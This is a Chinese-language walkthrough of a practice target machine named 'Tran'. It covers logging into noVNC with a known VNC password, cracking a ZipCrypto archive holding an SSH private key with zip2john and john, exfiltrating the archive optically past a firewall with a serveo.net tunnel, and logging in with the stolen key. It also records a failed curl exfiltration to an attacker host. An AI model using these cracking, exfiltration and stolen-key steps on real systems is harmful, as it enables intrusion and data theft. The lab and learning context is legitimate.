# 靶机 Tran — 渗透测试全过程记录

**目标 IP：** `192.168.1.235`（原 `192.168.101.136`，中途更换网段）
**难度：** 中等
**标签：** noVNC 远程桌面、VNC 弱口令认证、网络边界绕过（光学传输）、ZipCrypto 弱加密爆破、SSH 私钥登录

---

## 概述

Tran 靶机是一台以"数据提取 + 凭据破解"为主题的靶机，通关目标是：从靶机桌面取回一个加密压缩包 `a.zip`（内含 SSH 私钥 `id_rsa`），爆破出压缩包密码，并**用私钥 SSH 登录靶机**。整体攻击链如下：

1. 信息收集识别靶机开放 noVNC（WebSocket 6080）远程桌面服务，并已知 VNC 口令 `chenzi`。
2. 通过 noVNC 认证进入靶机桌面，发现加密压缩包 `a.zip`（内含 `id_rsa`、`id_rsa.pub`、`authorized_keys`）。
3. 靶机防火墙封死网络出入（`curl` / `scp` 均失败），改用 **decimen 光学传输**（屏幕 → 摄像头）将 `a.zip` 隔空导出到攻击机。
4. `zip2john` 提取加密哈希，`john` + rockyou 字典爆破出 ZipCrypto 弱口令，解压获得 SSH 私钥。
5. 使用私钥成功 SSH 登录靶机，达成通关目标。

**核心一句话：** 网络通道被封，就用"光"当信使；压缩包加密太弱，就离线爆破。拿到私钥，SSH 直达。

## 一、信息收集（Reconnaissance）

### 1.1 主机发现与端口扫描

先确认靶机在线：

```bash
ping 192.168.1.235
```

再对关键端口进行探测，确认 noVNC 服务存活：

```bash
nmap -p 6080 192.168.1.235
# 或
nc -zv 192.168.1.235 6080
```

扫描结果：

| 端口 | 服务 | 说明 |
|------|------|------|
| 6080 | noVNC（WebSocket） | VNC 的 WebSocket 代理入口，认证口令 `chenzi` |
| — | 其余端口 | 网络策略封闭，无其他可直连服务 |

> 注意：靶机 IP 曾为 `192.168.101.136`，后来更换网段变为 `192.168.1.235`，后续所有操作以 `.235` 为准。

### 1.2 服务识别 — noVNC 远程桌面

noVNC 是"网页版 VNC"：`websockify` 将 **WebSocket** 流量转换为普通 **TCP** 流量转发给 VNC 服务。因此不能按传统 VNC 的 `5900` 端口思路连接，而要走：

```
WebSocket 客户端 → ws://192.168.1.235:6080/websockify → websockify 转 TCP → VNC 服务（RFB）
```

- 底层协议为 **RFB**（Remote Framebuffer），本质是"共享一块屏幕画布"。
- 认证方式为 **VNC 口令认证**：服务器下发 16 字节随机挑战，客户端用口令按特定算法（DES + 位反转）加密挑战后回传，校验通过即建立会话。
- 桌面信息：分辨率 `1280x720`，会话名 `chenzi's X desktop (Tran:1)`——末尾的 `chenzi` 即为靶机用户名线索。

## 二、漏洞利用（Exploitation）

### 2.1 VNC 弱口令认证 — 获取远程桌面控制权

#### 认证机制原理

VNC 口令认证的关键步骤（RFB 003.008）：

```
客户端 → 服务端：  RFB 003.008\n
服务端 → 客户端：  协议版本确认
服务端 → 客户端：  安全类型列表（2 = VNC 口令认证）
客户端 → 服务端：  选择 VNC 认证
服务端 → 客户端：  16 字节随机挑战
客户端 → 服务端：  口令（按位反转后作 DES 密钥）加密挑战 → 回传
服务端 → 客户端：  认证结果（4 字节，全 0 = 通过）
```

其中"按位反转后作 DES 密钥"正是 VNC 认证的核心：口令字节先逐位反转（bit-reverse）再作为 DES 密钥加密挑战，对应脚本中的 `vnc_key()` + `des_block()`。

此外，WebSocket 规范要求**客户端 → 服务端**每一帧都必须用 4 字节随机掩码（`mask = os.urandom(4)`）异或，防止中间人把 HTTP 请求污染成 WebSocket——脚本 `ws_send()` 即实现此逻辑。

#### 利用过程 — 最小 noVNC 客户端

编写一个最小版 noVNC 客户端 `novnc_client.py`，封装 WebSocket 握手、RFB 握手、VNC 认证以及截屏/打字/点击等操作。顶部配置项按需修改：

```python
HOST = "192.168.1.235"    # 靶机 IP
PORT = 6080               # noVNC WebSocket 端口
WS_PATH = "/websockify"   # WebSocket 路径
PASSWORD = b"chenzi"      # VNC 口令
```

常用命令：

```bash
# 1) 仅测试连接 + 认证（最快验证口令正确性）
python novnc_client.py test
# 预期输出：auth OK, framebuffer 1280x720 name="chenzi's X desktop (Tran:1)"

# 2) 全屏截图
python novnc_client.py screenshot screen.png

# 3) 截取指定区域
python novnc_client.py region 100 100 400 300 region.png

# 4) 在靶机终端打字并回车
python novnc_client.py type "ls -la"

# 5) 只打字不回车
python novnc_client.py keys "echo hello"

# 6) 在屏幕坐标 (x,y) 处单击（左上角为 0,0）
python novnc_client.py click 640 400

# 7) 发送 Ctrl+Alt+Del
python novnc_client.py ctrlaltdel
```

认证成功输出：

```
[*] auth OK, framebuffer 1280x720 name="chenzi's X desktop (Tran:1)"
```

至此已获得靶机桌面的完整控制权（可截屏、可操作）。

#### 根因分析

| 要素 | 说明 |
|------|------|
| 触发点 | noVNC 服务（6080），仅依赖单一口令认证 |
| 漏洞类型 | 弱口令认证（无用户维度、无失败锁定、无访问来源限制） |
| 缺失防护 | VNC 口令强度过低且任意来源可直连 |
| 影响 | 直接进入靶机桌面，获知敏感文件 `a.zip` 的存在并可操作终端 |

### 2.2 加密压缩包 a.zip — 弱加密 + 弱口令

#### 目标物识别

对靶机桌面截图，可见 `a.zip` 及配套的 `a.txt`（`a.zip` 的 base64 编码，用于后续核对完整性）。在桌面终端确认：

```bash
python novnc_client.py type "ls -la ~/Desktop"
```

`a.zip` 内的三样文件构成完整的 SSH 密钥体系：

| 文件 | 作用 |
|------|------|
| `id_rsa` | SSH **私钥**，登录凭证的"钥匙"，必须保密 |
| `id_rsa.pub` | SSH **公钥**，可公开 |
| `authorized_keys` | 目标机器上的**信任列表**，公钥写入即授权 |

即：拿到 `id_rsa` + 压缩包口令 → 以 `chenzi` 身份 SSH 登录靶机。

#### 加密类型确认

在攻击机侧用 Python 确认加密类型为传统 ZipCrypto（非 AES）：

```python
import zipfile, struct
z = zipfile.ZipFile("a.zip")
for i in z.infolist():
    print(i.filename, "encrypted=", bool(i.flag_bits & 1))
```

#### 爆破过程

1. **提取加密哈希** —— zip 口令不以明文存储，先用 `zip2john` 转换为可离线猜测的哈希串：

```bash
zip2john a.zip > a.hash
cat a.hash
# 输出示例（$pkzip$ 前缀即 PKZIP 哈希）：
# a.zip:$pkzip$3*1*1*0*8*24*0762*ad3cdba1...$/$pkzip$::a.zip:authorized_keys, id_rsa, id_rsa.pub:a.zip
```

2. **准备字典** —— Kali 自带 rockyou 字典（gzip 压缩，先解压）：

```bash
ls /usr/share/wordlists/rockyou.txt 2>/dev/null \
  || gunzip -k /usr/share/wordlists/rockyou.txt.gz
```

3. **john 离线爆破**：

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt a.hash
john --show a.hash      # 输出末尾的 a.zip:<密码> 即口令
```

4. **解压**：

```bash
unzip a.zip      # 提示 Password 时输入爆破出的口令
ls -l            # 得到 authorized_keys / id_rsa / id_rsa.pub
```

#### 根因分析

| 要素 | 说明 |
|------|------|
| 漏洞类型 | 弱加密（ZipCrypto）+ 弱口令 |
| 机制 | ZipCrypto 密钥流由 3 个 32 位 CRC 寄存器滚动生成，强度极低；且 zip 头自带 12 字节明文校验（`TS_chk`），提供天然已知明文 |
| 影响 | 攻击者无需在线交互，即可用字典**离线**秒破口令，取回受保护的 SSH 私钥 |
| 附加风险 | 私钥明文存放于压缩包内，唯一防线仅为该弱口令 |

> 若 rockyou 未命中，说明口令不在常见字典，可改用已知口令组小字典（如 VNC 口令 `chenzi`、靶机名 `tran`、`mazesec`）或 john 掩码/规则模式继续尝试。

## 三、数据外带 — 防火墙绕过（decimen 光学传输）

### 3.1 网络通道评估（失败路径）

在确定最终方案前，逐一尝试将 `a.zip` 从靶机取出：

| 方案 | 结果 | 原因 |
|------|------|------|
| `curl http://192.168.1.76:8080/a.zip`（靶机 → 攻击机） | ❌ | 靶机防火墙封死出站 |
| `scp` 回传 | ❌ | 同上，入站/出站网络均被阻断 |
| 手机直连 PC 局域网 `http://192.168.1.76:8080` | ❌ | 路由器开启 **AP 隔离**，同一 WiFi 下设备互不相通 |
| `cloudflared` 打隧道 | ❌ | GitHub 下载被掐断，拿到的是截断的半成品 `exe` |
| `localhost.run` 隧道 | ❌ | 当前要求注册 SSH key，不再免费免注册 |
| 手机直接打开本地 `receiver.html`（`file://`） | ❌ | `file://` 非浏览器安全上下文，摄像头授权弹窗不出现；微信内置浏览器更是直接禁用摄像头 API |

**结论：任何走网络的路径都不通。** 唯一可行的思路是绕开网络——利用**物理信道**（屏幕 → 摄像头）进行"光学传输"。

### 3.2 光学传输原理

光学传输本质是**光通信**：

```
攻击机屏幕逐帧显示编码后的二维光学图案
        → 手机摄像头采样
        → 接收端反编码还原字节
        → 拼回原始文件
```

数据走的是"光"，不经过任何网络协议栈，因此**任何防火墙都无法拦截**。

所用工具为开源 PWA 项目 **decimen**（`https://github.com/bashalarmistalt/decimen-optical-transfer`），分为发送端 `/send/` 与接收端 `/receive/`。**发送端与接收端版本必须一致**（统一使用 `v0.4.0`），否则编解码表/码率参数对不上，无法还原。

### 3.3 利用过程

#### 步骤 1 — 部署 decimen v0.4.0

从 GitHub Release 下载 v0.4.0 的 Site 包并解压：

```
decimen-v0.4.0-site/
├── index.html
├── send/
├── receive/
└── assets/
```

#### 步骤 2 — 定制 HTTP 服务器（COOP/COEP 头）

decimen 接收端内部的多线程编码器依赖浏览器 `SharedArrayBuffer`，而该 API 要求响应携带两个头：

```
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
```

普通 `python -m http.server` **不会**附加这两个头，直接使用会导致接收端解码失败。编写定制服务器 `serve_http_coep.py`：

```python
import http.server, os, sys

os.chdir(os.path.dirname(os.path.abspath(__file__)))
PORT = 8080

class H(http.server.SimpleHTTPRequestHandler):
    extensions_map = http.server.SimpleHTTPRequestHandler.extensions_map.copy()
    extensions_map.update({
        ".wasm": "application/wasm",
        ".js":   "application/javascript",
        ".mjs":  "application/javascript",
        ".json": "application/json",
        ".svg":  "image/svg+xml",
        ".webmanifest": "application/manifest+json",
    })
    def end_headers(self):
        self.send_header("Cross-Origin-Opener-Policy", "same-origin")
        self.send_header("Cross-Origin-Embedder-Policy", "require-corp")
        super().end_headers()
    def log_message(self, fmt, *args):
        sys.stdout.write(fmt % args + "\n")
        sys.stdout.flush()

httpd = http.server.ThreadingHTTPServer(("0.0.0.0", PORT), H)
print(f"[+] decimen HTTP+COEP server up on :{PORT}", flush=True)
httpd.serve_forever()
```

启动：

```bash
cd decimen-v0.4.0-site
python serve_http_coep.py
```

#### 步骤 3 — serveo.net 公网隧道

手机无法直连 PC 局域网（AP 隔离），改用公网隧道将本地 8080 反向映射到一个 **HTTPS** 公网地址。`serveo.net` 免费、免注册，仅需攻击机可上外网：

```bash
ssh -o ServerAliveInterval=30 -o ServerAliveCountMax=3 \
    -o StrictHostKeyChecking=no -o ExitOnForwardFailure=yes \
    -R 80:localhost:8080 serveo.net
```

运行后输出公网地址，拼上 `/receive/` 即手机要打开的接收页：

```
https://2e60e891d932b9c4-xxx.serveousercontent.com/receive/
```

该地址为 **HTTPS + 有效证书**，属于浏览器"安全上下文"，摄像头授权弹窗才能正常弹出。

#### 步骤 4 — 手机端接收

生成二维码方便扫码打开：

```bash
pip install qrcode
python -c "import qrcode; qrcode.make('https://2e60e891d932b9c4-xxx.serveousercontent.com/receive/').save('receive_qr.png')"
```

**关键注意事项（最易卡住的环节）：**
1. 必须用手机**系统浏览器**（Chrome / Safari）打开，不能用微信内置浏览器——其 webview 禁用了摄像头 API，连授权弹窗都不出现。
2. 授权摄像头后看到相机画面，即接收端就绪。

#### 步骤 5 — 传输结果

1. 攻击机浏览器打开 `http://localhost:8080/send/`。
2. 选择 `a.zip` 开始发送，屏幕开始播放光学图案。
3. 手机接收端对准屏幕扫描、解码。
4. 传输完成后，手机下载目录出现 `a.zip`。✅

> 至此，被防火墙封死的文件，用"摄像头 + 屏幕"隔空取出。

## 四、初始访问（Initial Access）

### 4.1 SSH 私钥准备

查看公钥注释与私钥格式，推断目标用户名：

```bash
cat id_rsa.pub       # 末尾的 user@host 即生成者用户名
head -2 id_rsa       # 出现 "ENCRYPTED" 说明私钥自身还有口令；正常为 "BEGIN OPENSSH PRIVATE KEY"
```

SSH 对私钥权限严格，非 `600` 直接拒绝使用：

```bash
chmod 600 id_rsa
```

### 4.2 SSH 登录

```bash
ssh -i id_rsa -o IdentitiesOnly=yes chenzi@192.168.1.235
```

- `-i id_rsa`：指定私钥。
- `-o IdentitiesOnly=yes`：仅使用显式指定的私钥，不遍历 agent 中其他钥匙。
- 用户名 `chenzi`：由公钥注释推断，也可从 VNC 桌面会话名 `chenzi's X desktop (Tran:1)` 交叉确认。

### 4.3 老式 ssh-rsa 兼容参数

若登录报 `no mutual signature algorithm` / `sign_and_send_pubkey: invalid format`，说明靶机 OpenSSH 版本较老、使用旧式 `ssh-rsa` 公钥，而新版 OpenSSH 默认禁用该算法。追加参数重试：

```bash
ssh -i id_rsa -o IdentitiesOnly=yes \
    -o PubkeyAcceptedAlgorithms=+ssh-rsa \
    chenzi@192.168.1.235
```

登录成功即通关。🎯

## 五、总结

### 攻击链回顾

```
信息收集（6080 noVNC）→ VNC 弱口令认证 → 靶机桌面
    → 发现加密压缩包 a.zip（内含 SSH 私钥）
    → 网络通道全部失败 → decimen 光学传输隔空外带
    → zip2john + john 爆破 ZipCrypto 口令 → 解压获得 id_rsa
    → SSH 私钥登录 → 通关
```

### 漏洞盘点

| 序号 | 漏洞类型 | 位置 | CWE | 严重性 |
|------|----------|------|-----|--------|
| 1 | 远程桌面弱口令认证（无失败锁定、无来源限制） | noVNC / VNC 服务（6080） | CWE-521 | 中危 |
| 2 | 敏感凭据保护不当（SSH 私钥明文存放，唯一防线为压缩包口令） | `a.zip` | CWE-312 | 高危 |
| 3 | 压缩包弱加密（ZipCrypto）+ 弱口令，可离线字典爆破 | `a.zip` | CWE-326 / CWE-521 | 高危 |
| 4 | 边界防护盲区（防火墙仅拦截网络层，物理信道可旁路外带） | 靶机防火墙策略 | CWE-200 | 中危 |

### 关键知识点

| 技巧 | 说明 |
|------|------|
| noVNC 服务识别 | 走 WebSocket（6080 + `/websockify`），非传统 VNC 5900 端口 |
| VNC 认证机制 | 口令按位反转后作 DES 密钥，加密服务器 16 字节挑战 |
| WebSocket 掩码 | 客户端→服务端每帧必须以 4 字节随机掩码异或 |
| SharedArrayBuffer 前置条件 | 响应必须携带 COOP + COEP 头，否则多线程编码器不可用 |
| 公网隧道（serveo.net） | `ssh -R 80:localhost:8080 serveo.net` 免注册反代，突破 AP 隔离 |
| 安全上下文 | 摄像头 API 仅在 HTTPS/安全上下文可用，`file://` 无效 |
| ZipCrypto 弱点 | 密钥流基于 3 个 CRC 寄存器，带 12 字节明文校验，字典可秒破 |
| 光学传输 | 屏幕→摄像头走物理信道，彻底绕过网络层防火墙 |
